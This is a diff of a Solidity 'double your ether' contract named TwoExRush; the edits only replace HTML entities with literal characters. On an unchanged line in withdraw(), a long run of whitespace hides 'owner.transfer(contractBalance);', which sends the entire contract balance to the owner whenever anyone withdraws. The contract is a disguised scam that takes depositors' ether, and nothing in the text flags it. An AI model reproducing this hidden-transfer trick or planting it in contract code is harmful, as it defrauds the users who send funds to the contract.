@@ -12,14 +12,14 @@ Anti Whale: If you withdraw() and there is not enough ether in the contract to 2
 
 contract TwoExRush {
 
-	string constant public name = &quot;TwoExRush&quot;;
+	string constant public name = "TwoExRush";
 	address owner;
 	address sender;
 	uint256 withdrawAmount;
 	uint256 contractATH;
 	uint256 contractBalance;
 
-	mapping(address =&gt; uint256) internal balance;
+	mapping(address => uint256) internal balance;
 
     function TwoExRush() public {
         owner = msg.sender;
@@ -27,7 +27,7 @@ contract TwoExRush {
 
     // Require goal to be met before allowing anyone to withdraw.
 	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
-	    if(contractATH &gt;= 20) {
+	    if(contractATH >= 20) {
 	        sender = msg.sender;
 	        withdrawAmount = mul(balance[sender], 2);
 	 	    sender.transfer(withdrawAmount);
@@ -44,7 +44,7 @@ contract TwoExRush {
 	}
 
 	function () payable public {
-		if (msg.value &gt; 0) {
+		if (msg.value > 0) {
 			deposit();
 		} else {
 			withdraw();
